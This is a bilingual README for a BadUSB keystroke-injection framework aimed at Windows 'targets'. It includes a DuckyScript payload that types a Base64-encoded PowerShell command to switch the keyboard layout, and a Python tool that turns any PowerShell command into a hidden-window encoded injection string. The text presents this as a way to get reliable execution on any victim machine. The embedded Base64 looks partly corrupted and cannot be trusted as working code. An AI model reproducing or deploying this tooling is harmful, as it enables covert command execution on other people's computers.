Universal BadUSB: The Base64-Only Framework
The Zero-Fail Standard for HID Injection
## Project Overview
The single greatest point of failure in BadUSB (Human Interface Device) attacks is Keyboard Layout Incompatibility. A payload designed for a US (QWERTY) keyboard will catastrophically fail on a French (AZERTY), German (QWERTZ), or Spanish system. Critical symbols like \, /, :, _, and $ are located on different physical keys across the world.

This repository provides a Hardware-Agnostic Framework (Flipper Zero, Rubber Ducky, DigiSpark, ESP32) to guarantee 100% execution reliability on any Windows target, regardless of its language or keyboard configuration.

## The Philosophy: The "Common Denominator"
Instead of trying to guess the target's layout, we bypass the layout entirely. We utilize Systematic Base64 Encoding. The Base64 character set (A-Z, a-z, 0-9, +, /) shares the same physical key locations on 99% of Latin-script keyboards. By encoding payloads into Base64 and injecting them via PowerShell's native decoder, we achieve universal compatibility.

## Phase 1: The Environment Normalizer
Before running any complex payload, you must normalize the target environment. This script forces Windows to recognize the US-International layout using a Base64-encoded command. This "cleans" the environment for any future scripts.

File: 01_Environment_Normalizer.txt

Plaintext
REM --- UNIVERSAL LANGUAGE NORMALIZER ---
REM Description: Forces Windows to load the en-US keyboard layout.
REM Compatibility: Universal (AZERTY/QWERTY/QWERTZ)
REM Method: PowerShell -EncodedCommand (Base64)

DELAY 3000
GUI r
DELAY 500
STRING powershell -e JABsAD0ATgBlAHcALQBXAGkAbgBVAAc2AGUAcgBMAGEAbgBnAHUAYQBnAGUATABpAHMAdAAgAGUAbgAtAFUAUwA7ACQAbABbADAAXQAuAEkAbgBwAHUAdABNAAGUAdABoAG8AZABUAGkAcABzAC4AQwBsAGUAYQByACgAKQA7ACQAbABbADAAXQAuAEkAbgBwAHUAdABNAAGUAdABoAG8AZABUAGkAcABzAC4AQQBkAGQAKAAnADAANAAwADkAOgAwADAAMAAyADAANAAwADkAJwApADsAUwBlAHQALQBXAGkAbgBVAAc2AGUAcgBMAGEAbgBnAHUAYQBnAGUATABpAHMAdAAgACQAbAAgAC0ARgBvAHIAYwBlAA==
ENTER
## Phase 2: The Encoder Tool
Do not write scripts manually. Use this Python tool to convert any PowerShell command into a "Universal String."

File: Universal_Encoder.py

Python
import base64
import sys

# UNIVERSAL PAYLOAD GENERATOR
# Converts standard PowerShell commands into Layout-Agnostic Base64 strings.

def generate_universal_payload(command):
    # 1. PowerShell expects UTF-16LE encoding
    utf16_bytes = command.encode('utf-16-le')
    
    # 2. Encode to Base64
    base64_string = base64.b64encode(utf16_bytes).decode('utf-8')
    
    # 3. Format for BadUSB Injection
    return f"powershell -NoProfile -WindowStyle Hidden -e {base64_string}"

if __name__ == "__main__":
    print("--- UNIVERSAL BADUSB ENCODER ---")
    try:
        cmd = input("Enter your PowerShell command: ")
        print("\n[+] Your Universal Injection String:")
        print("-" * 50)
        print(generate_universal_payload(cmd))
        print("-" * 50)
    except KeyboardInterrupt:
        print("\nExiting...")
## Technical Deep Dive
Why does this work?

HID Mapping: A BadUSB device does not send letters; it sends "Scancodes" (location of keys). On an AZERTY keyboard, the Scancode for Q prints an A.

The Base64 Solution: The command powershell -e requires no special symbols. The payload itself is a string of alphanumeric characters.

OS-Level Decoding: Windows handles the translation. The BadUSB types safe characters, and the Operating System reconstructs the complex symbols (like http:// or System32) internally.

Universal BadUSB : Le Framework 100% Base64
La Solution Standard pour l'Injection HID sans Échec
## Présentation du Projet
Le point de défaillance majeur des attaques BadUSB (Human Interface Device) est l'incompatibilité des dispositions de clavier. Un payload conçu pour un clavier américain (QWERTY) échouera catastrophiquement sur un système français (AZERTY), allemand ou espagnol. Les symboles critiques comme \, /, :, _, et $ sont situés sur des touches différentes selon les pays.

Ce dépôt fournit un Framework Universel (compatible Flipper Zero, Rubber Ducky, DigiSpark, ESP32) garantissant une exécution à 100% sur n'importe quelle cible Windows, quelle que soit sa langue ou sa configuration clavier.

## La Philosophie : Le "Dénominateur Commun"
Au lieu de tenter de deviner la langue de la cible, nous contournons totalement le problème du clavier. Nous utilisons l'Encodage Base64 Systématique. Le jeu de caractères Base64 (A-Z, a-z, 0-9, +, /) partage les mêmes emplacements physiques sur 99% des claviers latins. En convertissant les payloads en Base64 et en les injectant via le décodeur natif de PowerShell, nous obtenons une compatibilité universelle.

## Phase 1 : Le Normaliseur d'Environnement
Avant de lancer un payload complexe, vous devez normaliser l'environnement de la cible. Ce script force Windows à reconnaître la disposition US-International en utilisant une commande encodée en Base64. Cela "nettoie" l'environnement pour les scripts futurs.

Fichier : 01_Environment_Normalizer.txt

Plaintext
REM --- UNIVERSAL LANGUAGE NORMALIZER ---
REM Description : Force Windows à charger le layout en-US.
REM Compatibilité : Universelle (AZERTY/QWERTY/QWERTZ)
REM Méthode : PowerShell -EncodedCommand (Base64)

DELAY 3000
GUI r
DELAY 500
STRING powershell -e JABsAD0ATgBlAHcALQBXAGkAbgBVAAc2AGUAcgBMAGEAbgBnAHUAYQBnAGUATABpAHMAdAAgAGUAbgAtAFUAUwA7ACQAbABbADAAXQAuAEkAbgBwAHUAdABNAAGUAdABoAG8AZABUAGkAcABzAC4AQwBsAGUAYQByACgAKQA7ACQAbABbADAAXQAuAEkAbgBwAHUAdABNAAGUAdABoAG8AZABUAGkAcABzAC4AQQBkAGQAKAAnADAANAAwADkAOgAwADAAMAAyADAANAAwADkAJwApADsAUwBlAHQALQBXAGkAbgBVAAc2AGUAcgBMAGEAbgBnAHUAYQBnAGUATABpAHMAdAAgACQAbAAgAC0ARgBvAHIAYwBlAA==
ENTER
## Phase 2 : L'Outil d'Encodage
N'écrivez pas vos scripts manuellement. Utilisez cet outil Python pour convertir n'importe quelle commande PowerShell en une "Chaîne Universelle".

Fichier : Universal_Encoder.py

Python
import base64
import sys

# GÉNÉRATEUR DE PAYLOAD UNIVERSEL
# Convertit les commandes PowerShell standards en chaînes Base64 indépendantes du clavier.

def generate_universal_payload(command):
    # 1. PowerShell nécessite un encodage UTF-16LE
    utf16_bytes = command.encode('utf-16-le')
    
    # 2. Encodage en Base64
    base64_string = base64.b64encode(utf16_bytes).decode('utf-8')
    
    # 3. Formatage pour Injection BadUSB
    return f"powershell -NoProfile -WindowStyle Hidden -e {base64_string}"

if __name__ == "__main__":
    print("--- UNIVERSAL BADUSB ENCODER ---")
    try:
        cmd = input("Entrez votre commande PowerShell : ")
        print("\n[+] Votre Chaîne d'Injection Universelle :")
        print("-" * 50)
        print(generate_universal_payload(cmd))
        print("-" * 50)
    except KeyboardInterrupt:
        print("\nFermeture...")
## Analyse Technique
Pourquoi cela fonctionne-t-il ?

Mappage HID : Un périphérique BadUSB n'envoie pas des lettres ; il envoie des "Scancodes" (l'emplacement des touches). Sur un clavier AZERTY, le Scancode pour la lettre Q affiche un A.

La Solution Base64 : La commande powershell -e ne nécessite aucun symbole spécial. Le payload lui-même est une suite de caractères alphanumériques.

Décodage au niveau OS : Windows gère la traduction. Le BadUSB tape des caractères sûrs, et le Système d'Exploitation reconstruit les symboles complexes (comme http:// ou System32) en interne, sans erreur d'interprétation.
